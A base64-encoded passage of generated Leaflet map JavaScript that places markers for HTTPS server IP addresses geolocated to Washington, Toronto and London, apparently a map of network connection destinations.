RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC4zMjxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMjU0NTdlNGM5YTI4NGQ2Y2ExMmMxOWY3YjNmZTc0MzMuc2V0Q29udGVudChodG1sX2I3YTE2NTkzODNmNjQwYjM5ZWEzZWQ5NGZjZjA1MTdmKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfOThkNTgzYjRiMmQxNDIxZjhmODJhMzBlYWM3MDZjZGUuYmluZFBvcHVwKHBvcHVwXzI1NDU3ZTRjOWEyODRkNmNhMTJjMTlmN2IzZmU3NDMzKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl85OGQ1ODNiNGIyZDE0MjFmOGY4MmEzMGVhYzcwNmNkZS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzhjNzc3Mzc1MzUxYjQ0OGZhMjM1NTViOTYzOGM5YTRmID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2NhZGUzNmVmOWZlODQ0MDdhMjBlNzdjNDY4NGFkOGJlID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzhjNzc3Mzc1MzUxYjQ0OGZhMjM1NTViOTYzOGM5YTRmLnNldEljb24oaWNvbl9jYWRlMzZlZjlmZTg0NDA3YTIwZTc3YzQ2ODRhZDhiZSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF82OGQyNjA2MDA4MDg0YmFkYWZkMjYzMzBhYTk0MmM1ZSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzVmMzFmNGE1ZTg3MjRkMmE4OTI4NDRjNTkyZmY0YzZiID0gJChgPGRpdiBpZD0iaHRtbF81ZjMxZjRhNWU4NzI0ZDJhODkyODQ0YzU5MmZmNGM2YiIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+NDAuODUuMjMyLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF82OGQyNjA2MDA4MDg0YmFkYWZkMjYzMzBhYTk0MmM1ZS5zZXRDb250ZW50KGh0bWxfNWYzMWY0YTVlODcyNGQyYTg5Mjg0NGM1OTJmZjRjNmIpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl84Yzc3NzM3NTM1MWI0NDhmYTIzNTU1Yjk2MzhjOWE0Zi5iaW5kUG9wdXAocG9wdXBfNjhkMjYwNjAwODA4NGJhZGFmZDI2MzMwYWE5NDJjNWUpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzhjNzc3Mzc1MzUxYjQ0OGZhMjM1NTViOTYzOGM5YTRmLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9jYmZkZGM3MTIzODg0NGZlOTIzNTI0N2YxYTk5MDcyOSA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2ZjZjAzZmYwNjVhODQxNmI4NmQ0MzQ1YmI1OWYyZDI1ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2NiZmRkYzcxMjM4ODQ0ZmU5MjM1MjQ3ZjFhOTkwNzI5LnNldEljb24oaWNvbl9mY2YwM2ZmMDY1YTg0MTZiODZkNDM0NWJiNTlmMmQyNSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9mMjlkMDNmYTU4NzQ0ZGZjOGI1OTNlNDU1NGJhYWI4NiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzkwMTA0MjIxMjMwYjRhMDJhMjdhMzcyNWYyOWQyY2IwID0gJChgPGRpdiBpZD0iaHRtbF85MDEwNDIyMTIzMGI0YTAyYTI3YTM3MjVmMjlkMmNiMCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5LjkyLjE5PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9mMjlkMDNmYTU4NzQ0ZGZjOGI1OTNlNDU1NGJhYWI4Ni5zZXRDb250ZW50KGh0bWxfOTAxMDQyMjEyMzBiNGEwMmEyN2EzNzI1ZjI5ZDJjYjApOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9jYmZkZGM3MTIzODg0NGZlOTIzNTI0N2YxYTk5MDcyOS5iaW5kUG9wdXAocG9wdXBfZjI5ZDAzZmE1ODc0NGRmYzhiNTkzZTQ1NTRiYWFiODYpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2NiZmRkYzcxMjM4ODQ0ZmU5MjM1MjQ3ZjFhOTkwNzI5LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfN2RiNTBhNjIzZGYzNDMxODgwZmYzMDhhZjllNTBlYWQgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNDMyNmU5ZGQ4OTc3NDBmYmE1NzgxNmEwY2UzOGY5OTkgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfN2RiNTBhNjIzZGYzNDMxODgwZmYzMDhhZjllNTBlYWQuc2V0SWNvbihpY29uXzQzMjZlOWRkODk3NzQwZmJhNTc4MTZhMGNlMzhmOTk5KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzdjYWI0NWI2NDViYjRlYzZhNTRmODEwMmYxOTJmYzkwID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNThlYzEwMTI2ZDRiNDlkZWJkN2IwYzAwMjY3Y2VhODAgPSAkKGA8ZGl2IGlkPSJodG1sXzU4ZWMxMDEyNmQ0YjQ5ZGViZDdiMGMwMDI2N2NlYTgwIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj40MC44NS4yMzIuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzdjYWI0NWI2NDViYjRlYzZhNTRmODEwMmYxOTJmYzkwLnNldENvbnRlbnQoaHRtbF81OGVjMTAxMjZkNGI0OWRlYmQ3YjBjMDAyNjdjZWE4MCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzdkYjUwYTYyM2RmMzQzMTg4MGZmMzA4YWY5ZTUwZWFkLmJpbmRQb3B1cChwb3B1cF83Y2FiNDViNjQ1YmI0ZWM2YTU0ZjgxMDJmMTkyZmM5MCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfN2RiNTBhNjIzZGYzNDMxODgwZmYzMDhhZjllNTBlYWQuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzY1NjJjMDQ5MTc5MDQwNDdhNTY1NTc2MGZmN2U4YjIxID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzAxYjkyY2MxMzAxNDQ4ODM5ZWY2ZWUzMzA0NGQ3YzQ0ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzY1NjJjMDQ5MTc5MDQwNDdhNTY1NTc2MGZmN2U4YjIxLnNldEljb24oaWNvbl8wMWI5MmNjMTMwMTQ0ODgzOWVmNmVlMzMwNDRkN2M0NCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8zMzRiZWZmNDg4ZDI0MTg4YWFjZjUzYzg2OTNkODc4NyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzA0ZjRmMjdhN2NhZjQ3ZWM5NmE0MDg3OGMzYmUyMzFlID0gJChgPGRpdiBpZD0iaHRtbF8wNGY0ZjI3YTdjYWY0N2VjOTZhNDA4NzhjM2JlMjMxZSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+NDAuODUuMjMyLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8zMzRiZWZmNDg4ZDI0MTg4YWFjZjUzYzg2OTNkODc4Ny5zZXRDb250ZW50KGh0bWxfMDRmNGYyN2E3Y2FmNDdlYzk2YTQwODc4YzNiZTIzMWUpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl82NTYyYzA0OTE3OTA0MDQ3YTU2NTU3NjBmZjdlOGIyMS5iaW5kUG9wdXAocG9wdXBfMzM0YmVmZjQ4OGQyNDE4OGFhY2Y1M2M4NjkzZDg3ODcpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzY1NjJjMDQ5MTc5MDQwNDdhNTY1NTc2MGZmN2U4YjIxLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9hYWQ0NjJkZDM3OTQ0NzlhODY5MGUwZjU5MDY0ZDNhNSA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9jOTFjYTk0NTNjM2U0MDA1YWFkOGM3M2Q1MTIxZGYyZSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9hYWQ0NjJkZDM3OTQ0NzlhODY5MGUwZjU5MDY0ZDNhNS5zZXRJY29uKGljb25fYzkxY2E5NDUzYzNlNDAwNWFhZDhjNzNkNTEyMWRmMmUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfMjRhNTc3ZWZkZDVlNGVlZjk4NzM1YzBkZWYxNjZjZmUgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9jMzU0MjZlMTQyMGE0MTQ1YjhhNGQyZDU0ODIxMTFkYSA9ICQoYDxkaXYgaWQ9Imh0bWxfYzM1NDI2ZTE0MjBhNDE0NWI4YTRkMmQ1NDgyMTExZGEiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjcxLjE3Mi4xMjg8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzI0YTU3N2VmZGQ1ZTRlZWY5ODczNWMwZGVmMTY2Y2ZlLnNldENvbnRlbnQoaHRtbF9jMzU0MjZlMTQyMGE0MTQ1YjhhNGQyZDU0ODIxMTFkYSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2FhZDQ2MmRkMzc5NDQ3OWE4NjkwZTBmNTkwNjRkM2E1LmJpbmRQb3B1cChwb3B1cF8yNGE1NzdlZmRkNWU0ZWVmOTg3MzVjMGRlZjE2NmNmZSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYWFkNDYyZGQzNzk0NDc5YTg2OTBlMGY1OTA2NGQzYTUuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2E5NTMwYzFhZWUxNzRjZGI4ZDJjZDMxZGVhNDJlOGRiID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2EwYWZmYzdhYmRlNjQyNmFiYWRlYTE5MThiMjkwN2Q1ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2E5NTMwYzFhZWUxNzRjZGI4ZDJjZDMxZGVhNDJlOGRiLnNldEljb24oaWNvbl9hMGFmZmM3YWJkZTY0MjZhYmFkZWExOTE4YjI5MDdkNSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF85YmJjOTljMzNlNWY0ZjNkODBiNWJlZDQyNGVhMzBkOCA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzU2OGZjZTE4ODNmMDQzYWJiMzI3ZWM2YTMxMDYzMjIxID0gJChgPGRpdiBpZD0iaHRtbF81NjhmY2UxODgzZjA0M2FiYjMyN2VjNmEzMTA2MzIyMSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuODguMjU1LjExNTxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfOWJiYzk5YzMzZTVmNGYzZDgwYjViZWQ0MjRlYTMwZDguc2V0Q29udGVudChodG1sXzU2OGZjZTE4ODNmMDQzYWJiMzI3ZWM2YTMxMDYzMjIxKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfYTk1MzBjMWFlZTE3NGNkYjhkMmNkMzFkZWE0MmU4ZGIuYmluZFBvcHVwKHBvcHVwXzliYmM5OWMzM2U1ZjRmM2Q4MGI1YmVkNDI0ZWEzMGQ4KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9hOTUzMGMxYWVlMTc0Y2RiOGQyY2QzMWRlYTQyZThkYi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfZTQ3YzJjMWM5ZDBlNDZhY2I3NjM4ODViZDhlNjFmNzggPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fODA2OWVmMTdkYTlmNGE4M2FjZWNmMjZhMDFkMGJkZTcgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZTQ3YzJjMWM5ZDBlNDZhY2I3NjM4ODViZDhlNjFmNzguc2V0SWNvbihpY29uXzgwNjllZjE3ZGE5ZjRhODNhY2VjZjI2YTAxZDBiZGU3KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2Q5ZDA2NDZjZjY3YTQzYjdiZjQwOTM5YmQzNDk4MmVhID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfZGVkY2MzMjVjNGQzNDlhNmE2MzY3OWQxYWRlM2IwNmYgPSAkKGA8ZGl2IGlkPSJodG1sX2RlZGNjMzI1YzRkMzQ5YTZhNjM2NzlkMWFkZTNiMDZmIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4yMjAuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2Q5ZDA2NDZjZjY3YTQzYjdiZjQwOTM5YmQzNDk4MmVhLnNldENvbnRlbnQoaHRtbF9kZWRjYzMyNWM0ZDM0OWE2YTYzNjc5ZDFhZGUzYjA2Zik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2U0N2MyYzFjOWQwZTQ2YWNiNzYzODg1YmQ4ZTYxZjc4LmJpbmRQb3B1cChwb3B1cF9kOWQwNjQ2Y2Y2N2E0M2I3YmY0MDkzOWJkMzQ5ODJlYSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZTQ3YzJjMWM5ZDBlNDZhY2I3NjM4ODViZDhlNjFmNzguYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8yM2VlMmJmOGFhMWE0ZTQ4OWNmYTY0NjQzZWRiNWUyYyA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl84MTY2NjdhZWQ0YmU0OWZkYTEzOGM2MzVjYmMyNWQ3MCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8yM2VlMmJmOGFhMWE0ZTQ4OWNmYTY0NjQzZWRiNWUyYy5zZXRJY29uKGljb25fODE2NjY3YWVkNGJlNDlmZGExMzhjNjM1Y2JjMjVkNzApOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNTU5YjdhNjIxZTRiNGU5N2FjZTk0OWY3MzRkZDc1Y2MgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMw